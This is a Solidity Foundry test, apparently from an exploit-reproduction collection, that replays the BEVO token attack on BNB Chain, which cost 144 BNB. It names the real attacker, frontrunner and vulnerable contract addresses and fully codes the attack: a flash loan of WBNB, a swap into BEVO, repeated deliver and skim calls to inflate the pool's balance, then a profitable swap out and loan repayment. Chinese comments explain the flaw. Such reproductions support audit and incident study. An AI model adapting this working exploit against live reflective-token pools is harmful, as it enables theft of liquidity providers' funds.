// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";
import "./CoinToken.sol";

// Total lost: 144 BNB
// Frontrunner: https://bscscan.com/address/0xd3455773c44bf0809e2aeff140e029c632985c50
// Original Attacker: https://bscscan.com/address/0x68fa774685154d3d22dec195bc77d53f0261f9fd
// Frontrunner Contract: https://bscscan.com/address/0xbec576e2e3552f9a1751db6a4f02e224ce216ac1
// Original Attack Contract: https://bscscan.com/address/0xbf7fc9e12bcd08ec7ef48377f2d20939e3b4845d
// Vulnerable Contract: https://bscscan.com/address/0xc6cb12df4520b7bf83f64c79c585b8462e18b6aa
// Attack Tx: https://bscscan.com/tx/0xb97502d3976322714c828a890857e776f25c79f187a32e2d548dda1c315d2a7d

// @Analysis
// https://twitter.com/QuillAudits/status/1620377951836708865
// 本次攻击发生的第一个原因是attacker在调用代币合约中的deliver函数之后，所有非白名单中的账户的余额都会增加。
// 现在为什么attacker知道pair增加的余额一定大于自己销毁的余额呢？

contract BEVOExploit is Test {
    IERC20 private constant wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    // reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    CoinToken bevo = CoinToken(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    IUniswapV2Pair private constant wbnb_usdc = IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
    IUniswapV2Pair private constant bevo_wbnb = IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    IPancakeRouter private constant router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address tester = vm.addr(1);

    function setUp() public {
        
        cheats.createSelectFork("bsc", 25_230_702);

        cheats.label(address(wbnb), "WBNB");
        cheats.label(address(bevo), "BEVO");
        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
        cheats.label(address(router), "PancakeRouter");
    }

    function testExploit() external {
        // flashloan WBNB from PancakePair
        emit log_named_decimal_uint("WBNB balance before exploit", wbnb.balanceOf(address(this)), 18);

        //1.First approve Pancake router
        wbnb.approve(address(router), type(uint256).max);
        //2.swap-flashloan
        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
        emit log_named_decimal_uint("WBNB balance after exploit", wbnb.balanceOf(address(this)), 18);
    }

    function pancakeCall(
        address /*sender*/,
        uint256 /*amount0*/,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bevo);
        //3.use loan to swap bevo
        // The current number of tokens in the contract is: 192 WBNB
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        // =====================================================
        console.log("after first swap, the this balance of bevo:", bevo.balanceOf(address(this)));
        // 192 WBNB -> 3.02 BEVO
        // The current number of tokens in the contract is: 3.02 BEVO
        // Actually, we just transfered 3.02 BEVO to bevo,but we got 4.5 BEVO in bevo contract

        bevo.deliver(bevo.balanceOf(address(this)));
        bevo_wbnb.skim(address(this));
        // The current number of tokens in the contract is: 4.5 BEVO
        // deliver应该就是把bevo从账户手中的余额转入到bevo中
        bevo.deliver(bevo.balanceOf(address(this)));

        emit log_named_decimal_uint(
            "now after two time deliver,the bevo balance of pair:",
            bevo.balanceOf(address(bevo_wbnb)),
            18
        );
        bevo_wbnb.swap(337 ether, 0, address(this), "");
        //after swap,this contract: bevo 0 wbnb 337

        wbnb.transfer(address(wbnb_usdc), 193 ether);
    }
}

// /* -------------------- Interface -------------------- */

// interface reflectiveERC20 {
//     function transfer(address to, uint256 amount) external returns (bool);

//     function approve(address spender, uint256 amount) external returns (bool);

//     function balanceOf(address account) external view returns (uint256);

//     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

//     function deliver(uint256 tAmount) external;
// }
